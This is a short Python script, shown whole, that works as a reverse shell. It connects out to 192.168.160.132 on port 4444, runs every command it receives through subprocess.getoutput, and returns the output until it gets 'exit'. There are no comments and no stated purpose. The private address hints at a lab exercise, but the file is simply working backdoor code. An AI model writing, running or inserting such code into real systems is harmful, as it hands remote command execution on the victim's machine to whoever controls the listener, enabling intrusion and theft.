import socket
import subprocess

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('192.168.160.132', 4444))

while True:
    command = client_socket.recv(1024).decode()
    
    if command.lower() == "exit":
        break

    output = subprocess.getoutput(command)
    client_socket.send(output.encode())

client_socket.close()
